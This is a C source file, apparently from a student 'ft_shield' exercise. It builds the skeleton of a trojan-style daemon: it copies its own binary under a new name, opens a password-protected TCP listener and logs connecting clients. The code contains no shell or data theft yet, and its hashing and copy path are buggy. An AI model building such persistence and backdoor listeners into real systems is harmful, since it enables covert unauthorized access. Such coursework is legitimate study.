/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/11/16 18:15:16 by mbatty            #+#    #+#             */
/*   Updated: 2025/11/21 11:55:27 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ctx.h"

int	g_sig = 0;

void	handle_sig(int sig)
{
	g_sig = sig;
}

char	*sha256(const char *input)
{
	EVP_MD_CTX* context = EVP_MD_CTX_new();
	if (!context)
		return (NULL);

	const EVP_MD* md = EVP_sha256();
	if (!EVP_DigestInit_ex(context, md, NULL))
		return (NULL);

	if (!EVP_DigestUpdate(context, input, strlen(input)))
		return (NULL);

	unsigned char hash[EVP_MAX_MD_SIZE];
	unsigned int lengthOfHash = 0;

	if (!EVP_DigestFinal_ex(context, hash, &lengthOfHash))
		return (NULL);

	EVP_MD_CTX_free(context);

	char	*res = calloc(lengthOfHash + 1, sizeof(char));
	if (!res)
		return (NULL);

	for (unsigned int i = 0; i < lengthOfHash; i++)
		res[i] = LOWERCASE_HEXA[hash[i] % 16];

	return (res);
}

int	check_client_password(t_ctx *ctx, t_client *client, char *msg)
{
	if (!client->logged)
	{
		char *hashed_msg = sha256(msg);
		int	cmp = strcmp(hashed_msg, PASSWORD);
		free(hashed_msg);
		if (!cmp)
		{
			logger_log(ctx, LOG_LOG, "Client %d correct password", client->id, msg);
			server_send_to_id(&ctx->server, client->id, CORRECT_PASSWORD_TEXT);
			client->logged = true;
			return (0);
		}
		logger_log(ctx, LOG_LOG, "Client %d wrong password", client->id, msg);
		server_send_to_id(&ctx->server, client->id, INCORRECT_PASSWORD_TEXT);
		return (0);
	}
	return (1);
}

void	message_hook(t_client *client, char *msg, void *ptr)
{
	t_ctx	*ctx = ptr;

	if (!check_client_password(ctx, client, msg))
		return ;

	logger_log(ctx, LOG_LOG, "From %d: %s", client->id, msg);
}

void	connect_hook(t_client *client, void *ptr)
{
	t_ctx	*ctx = ptr;

	server_send_to_id(&ctx->server, client->id, "Welcome to server!\n");
	server_send_to_id(&ctx->server, client->id, PASSWORD_PROMPT_TEXT);
	logger_log(ctx, LOG_INFO, "Client %d joined", client->id);
}

void	disconnect_hook(t_client *client, void *ptr)
{
	t_ctx	*ctx = ptr;

	logger_log(ctx, LOG_INFO, "Client %d left", client->id);
}

int	ctx_init(t_ctx *ctx)
{
	memset(ctx, 0, sizeof(t_ctx));
	signal(SIGINT, handle_sig);

	ctx->log_fd = open("ft_shield.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
	if (ctx->log_fd == -1)
		return (0);
	logger_log(ctx, LOG_INFO, "Starting ft_shield");

	logger_log(ctx, LOG_INFO, "Opening server");
	if (!server_open(&ctx->server, SERVER_PORT))
	{
		logger_log(ctx, LOG_ERROR, "Failed to open server");
		close(ctx->log_fd);
		return (0);
	}
	server_set_message_hook(&ctx->server, message_hook, ctx);
	server_set_connect_hook(&ctx->server, connect_hook, ctx);
	server_set_disconnect_hook(&ctx->server, disconnect_hook, ctx);
	logger_log(ctx, LOG_INFO, "Server opened");
	return (1);
}

int	ctx_delete(t_ctx *ctx)
{
	logger_log(ctx, LOG_INFO, "Closing server");
	server_close(&ctx->server);
	logger_log(ctx, LOG_INFO, "Closing ft_shield");
	close(ctx->log_fd);
	return (0);
}

int	ctx_loop(t_ctx *ctx)
{
	while (g_sig == 0)
	{
		server_update(&ctx->server);

	}
	return (1);
}

void	export_payload(char *src_path, char *dst_path)
{
	char 	buf[4096];
	ssize_t rdb;
	int		fdin;
	int		fdout;

	fdin = open(src_path, O_RDONLY);
	fdout = open(dst_path, O_CREAT | O_WRONLY | O_TRUNC, 0777);

	do
	{
		rdb = read(fdin, buf, sizeof(buf));
		write(fdout, buf, rdb);
	} while (rdb > 0);

	close(fdin);
	close(fdout);
}

int	main(int ac, char **av)
{
	t_ctx	ctx;
	
	(void)ac;
	printf("mbatty\n");

	export_payload(av[0], "binft_shield");
	if (!strcmp("/bin/ft_shield", av[0]))
	{
		printf("Execute as daemon\n");
	}
	else
		printf("Export payload!\n");

	if (!ctx_init(&ctx))
		return (0);
	ctx_loop(&ctx);
	return (ctx_delete(&ctx));
}
